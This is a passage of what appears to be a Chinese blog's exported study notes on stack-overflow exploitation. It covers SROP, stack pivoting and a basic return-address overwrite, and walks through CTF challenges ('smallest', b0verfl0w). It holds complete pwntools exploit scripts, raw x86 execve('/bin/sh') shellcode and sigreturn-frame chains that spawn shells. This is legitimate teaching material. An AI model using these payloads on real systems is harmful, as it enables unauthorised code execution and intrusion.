0UNcfL5EKRzd91UDxsKVut24y65T5M5ibHCdRx47IsVNnJeFyhhQqlrooi8Ncy29P5Ssjfsmy7hLK/lmGeJo4LoFPyk7lDolIkSSfPSmn4jIqXH9VH3+3XsskSaHeo5NDRKtQ3nvkTqUvID8P8bT7NcpgMBgMhqMHhz+VoyRtM/57/8vYajy54m8udQIR0uxONArwRq1q61khIsMfw/tcTdtxZf6FqfdPRESq6SK6OoEIadEKLZoGI8Cntm2PDksu4/f3P0WsLXWUUpzwC+ZGmHoMpkad4DvRNLD29T8n4YjxJBIiIiK6TTCpsED24Q8xNOxZrI6twL5pOYqTZ21zBZum9sXAt/fiVnw76a0k79RijAgdhU8O2fLK31Qk55ZYVDJz5+u4/4WfcMGG1v5Wcgk/TX4FG80k1DfELnkBi05XRqNERERUEzGpsEgJMg8vxMiWd2L49O9xKK38PbJO/4EFE8PQatwmhRv/fMT/uhCf/nYAF6y610zH8Z8/wL/aN8GAt7fjCl8lWyPkRa/AhNCG6DHxY6w/bcEdOgCgGElH/sCnU0ch1K893txv6ROpLByeNwwhDfvgqenL8OOOI4i5nInCCva9IPoTPNR3En5UeEPuNVcROf9h9Hl+M9Klgo0QERFRjeeEa+OgyBpqd4SEDcDd3duhefAd8PXQQ1WYhYzUJMQe349d2zdjx7FkCxfddoFPSHt07tgKIQ0DUf8OP3i5GaCv5QKNFCInIwWJ56Nx4sAubN2yDzGZzCRqNg08Qrrh7l5d0KZZMOr7ecFNp0ZxbiYyr6bjcvxpHD96GPt37cOpKw70qmAXP3QeOhJD72qLxnXdoMpLRfyJXVj//WpsPp0Jy56jEBER0a2KSQUREREREdmEw5+IiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgmTCqIiIiIiMgm/wc9DP78DLvBJgAAAABJRU5ErkJggg==\" alt=\"gadget1\"></p>\n<p>但是目前它已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>\n<p>值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</p>\n<p><strong>利用工具</strong></p>\n<p><strong>值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。</strong></p>\n<p><strong>360春秋杯中的smallest-pwn为例</strong></p>\n<p>1.确定文件基本信息</p>\n<p>➜ smallest file smallest<br> smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</p>\n<p>可以看到该程序为64位静态链接版本。</p>\n<p>2.检查保护</p>\n<p>➜ smallest checksec smallest<br>   Arch:   amd64-64-little<br>   RELRO:  No RELRO<br>   Stack:  No canary found<br>   NX:    NX enabled<br>   PIE:   No PIE (0x400000)</p>\n<p>程序主要开启了NX保护。</p>\n<p>3.漏洞发现</p>\n<p>实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public start</span><br><span class=\"line\">start proc near</span><br><span class=\"line\">xor     rax, rax</span><br><span class=\"line\">mov     edx, 400h</span><br><span class=\"line\">mov     rsi, rsp</span><br><span class=\"line\">mov     rdi, rax</span><br><span class=\"line\">syscall</span><br><span class=\"line\">retn</span><br><span class=\"line\">start endp</span><br></pre></td></tr></table></figure>\n\n<p>根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。</p>\n<p>4.利用思路</p>\n<p>由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下</p>\n<ul>\n<li>通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn</li>\n<li>通过syscall执行execve(“/bin/sh”,0,0)来获取shell。</li>\n</ul>\n<p>5.漏洞利用程序</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">7777</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    sh = process(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x00000000004000BE</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x00000000004000B0</span></span><br><span class=\"line\"><span class=\"comment\">## set start addr three times</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"><span class=\"comment\">## modify the return addr to start_addr+3</span></span><br><span class=\"line\"><span class=\"comment\">## so that skip the xor rax,rax; then the rax=1</span></span><br><span class=\"line\"><span class=\"comment\">## get stack addr</span></span><br><span class=\"line\">sh.send(<span class=\"string\">&#x27;\\xb3&#x27;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"><span class=\"comment\">## make the rsp point to stack_addr</span></span><br><span class=\"line\"><span class=\"comment\">## the frame is read(0,stack_addr,0x400)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"><span class=\"comment\">## set rax=15 and call sigreturn</span></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"><span class=\"comment\">## call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(frame_payload)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span> - <span class=\"built_in\">len</span>(frame_payload)) * <span class=\"string\">&#x27;\\x00&#x27;</span> + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>其基本流程为</p>\n<ul>\n<li>读取三个程序起始地址</li>\n<li>程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1</li>\n<li>那么此时将会执行write(1,$esp,0x400)，泄露栈地址。</li>\n<li>利用第三个程序起始地址进而读入payload</li>\n<li>再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve(‘/bin/sh’,0,0)</li>\n<li>再次读取构造sigreturn调用，从而获取shell。</li>\n</ul>\n<p><strong>花式栈溢出技巧</strong></p>\n<p><strong>stack privot</strong></p>\n<p>stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot</p>\n<ul>\n<li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li>\n<li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>\n<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞</li>\n</ul>\n<p>此外，利用stack privot有以下几个要求</p>\n<ul>\n<li><p>可以控制程序执行流。</p>\n</li>\n<li><p>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是</p>\n<p><strong>pop rsp/esp</strong></p>\n</li>\n</ul>\n<p>当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/7i 0x000000000040061a</span><br><span class=\"line\">0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx</span><br><span class=\"line\">0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp</span><br><span class=\"line\">0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12</span><br><span class=\"line\">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class=\"line\">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class=\"line\">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class=\"line\">0x400624 &lt;__libc_csu_init+100&gt;: ret    </span><br><span class=\"line\">gef➤  x/7i 0x000000000040061d</span><br><span class=\"line\">0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp</span><br><span class=\"line\">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class=\"line\">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class=\"line\">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class=\"line\">0x400624 &lt;__libc_csu_init+100&gt;: ret</span><br></pre></td></tr></table></figure>\n\n<p>此外，还有更加高级的fake frame。</p>\n<ul>\n<li>存在可以控制内容的内存，一般有如下</li>\n<li>bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。</li>\n<li>heap。但是这个需要我们能够泄露堆地址。</li>\n</ul>\n<p>以<strong>X-CTF Quals 2016 - b0verfl0w</strong>为例</p>\n<p>1.首先，查看程序的安全保护，如下：</p>\n<p>➜ X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w<br>   Arch:   i386-32-little<br>   RELRO:  Partial RELRO<br>   Stack:  No canary found<br>   NX:    NX disabled<br>   PIE:   No PIE (0x8048000)<br>   RWX:   Has RWX segments</p>\n<p>2.可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> <span class=\"title\">vul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+18h] [bp-20h]@1</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\n======================&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\n======================&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  fgets(&amp;s, <span class=\"number\">50</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello %s.&quot;</span>, &amp;s);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下：</p>\n<p>- 利用栈溢出布置shellcode<br> - 控制eip指向shellcode处</p>\n<p>4.第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only &#x27;jmp|ret&#x27;         </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08048504 : jmp esp</span><br><span class=\"line\">0x0804836a : ret</span><br><span class=\"line\">0x0804847e : ret 0xeac1</span><br><span class=\"line\">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>\n\n<p>5.这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp</span><br></pre></td></tr></table></figure>\n\n<p>那么我们payload中的最后一部分改如何设置esp呢，可以知道：</p>\n<ul>\n<li>size(shellcode+padding)=0x20</li>\n<li>size(fake ebp)=0x4</li>\n<li>size(0x08048504)=0x4</li>\n</ul>\n<p>所以我们最后一段需要执行的指令就是：</p>\n<p>sub 0x28,esp<br>jmp esp</p>\n<p>所以最后的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class=\"line\">shellcode_x86 = <span class=\"string\">&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">&quot;\\x0b\\xcd\\x80&quot;</span></span><br><span class=\"line\">sub_esp_jmp = asm(<span class=\"string\">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class=\"line\">jmp_esp = <span class=\"number\">0x08048504</span></span><br><span class=\"line\">payload = shellcode_x86 + (</span><br><span class=\"line\">    <span class=\"number\">0x20</span> - <span class=\"built_in\">len</span>(shellcode_x86)) * <span class=\"string\">&#x27;b&#x27;</span> + <span class=\"string\">&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"完了，应该？？-≧-﹏-≦！！！\"><a href=\"#完了，应该？？-≧-﹏-≦！！！\" class=\"headerlink\" title=\"完了，应该？？ ≧ ﹏ ≦！！！\"></a>完了，应该？？ ≧ ﹏ ≦！！！</h3>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习笔记<span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>栈介绍</strong></p>\n<p>栈是一种典型的先进后出(First in Last Out)的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作，如下图所示（维基百科）。两种操作都是操作栈顶，当然，它也有相应的栈底。</p>\n<p>在计算机的汇编程序运行过程中，也充分利用了这一数据结构。每个程序都有自己的进程地址空间，进程地址空间中的某一部分就是该程序对应的栈，用于<strong>保存函数调用信息和局部变量</strong>。此外，常见的操作也同样是压栈与出栈。需要注意的是，与一般我们理解不同的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>\n<p><strong>函数调用栈</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629135714461.png\" alt=\"image-20210629135714461\" style=\"zoom:67%;\" />\n\n<p>需要注意的是，32位程序与64位程序有以下简单的区别</p>\n<ul>\n<li><p><strong>x86</strong></p>\n</li>\n<li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p>\n</li>\n<li><p><strong>x64</strong></p>\n</li>\n<li><p>x64中前六个参数依次保存在<strong>RDI,RSI, RDX, RCX, R8和 R9寄存器</strong>里，如果还有更多的参数的话才会保存在栈上。</p>\n</li>\n<li><p>内存地址不能大于0x00007FFFFFFFFFFF，<strong>6个字节长度</strong>，否则会抛出异常。</p>\n</li>\n</ul>\n<p><strong>栈溢出原理</strong></p>\n<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p>\n<ul>\n<li>程序必须向栈上写入数据。</li>\n<li>写入的数据大小没有被良好地控制。</li>\n</ul>\n<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址的代码可以执行</strong>。下面，我们举一个简单的例子：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\">#<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">success</span><span class=\"params\">()</span> </span>&#123; <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">vulnerable</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s[<span class=\"number\">12</span>];</span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</span><br><span class=\"line\">  vulnerable();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行success函数。</strong></p>\n<p>1.首先，我们利用如下命令对齐进行编译</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example</span><br><span class=\"line\">stack_example.c: In function ‘vulnerable’:</span><br><span class=\"line\">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class=\"line\">   gets(s);</span><br><span class=\"line\">   ^</span><br><span class=\"line\">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class=\"line\">stack_example.c:(.text+0x27): 警告： the `gets&#x27; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>\n\n<p>可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，</p>\n<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。</p>\n<p>此外，-m32 指的是生成32位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。</p>\n<p>2.然后，我们在win操作机上利用IDA来反编译一下二进制程序并查看vulnerable函数（点击g输入vulnerable回车可以直接转到该函数），可以看到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">vulnerable</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+4h] [bp-14h]@1</span></span><br><span class=\"line\">gets(&amp;s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.可以看到，该字符串距离ebp的长度为0x14，那么相应的栈结构为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+-----------------+</span><br><span class=\"line\">                          |     retaddr     |</span><br><span class=\"line\">                          +-----------------+</span><br><span class=\"line\">                          |     saved ebp   |</span><br><span class=\"line\">                   ebp---&gt;+-----------------+</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">             s,ebp<span class=\"number\">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>\n\n<p>并且，我们可以通过readelf获得success的地址，其地址为0x0804843B。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -a stack_example |grep success</span><br><span class=\"line\">54: 0804843b    25 FUNC    GLOBAL DEFAULT   14 success</span><br></pre></td></tr></table></figure>\n\n<p>4.那么，如果我们读取的字符串为</p>\n<p>0x14*’a’+’bbbb’+success_addr</p>\n<p>由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+-----------------+</span><br><span class=\"line\">                              |    <span class=\"number\">0x0804843B</span>   |</span><br><span class=\"line\">                              +-----------------+</span><br><span class=\"line\">                              |       bbbb      |</span><br><span class=\"line\">                       ebp---&gt;+-----------------+</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                 s,ebp<span class=\"number\">-0x14</span>--&gt;+-----------------+\t</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，由于在计算机内存中，对应的每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B的存储是如下结构</p>\n<p>\\x3b\\x84\\x04\\x08</p>\n<p>6.但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\\，x等也算一个单独的字符。。所以我们需要想办法将\\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 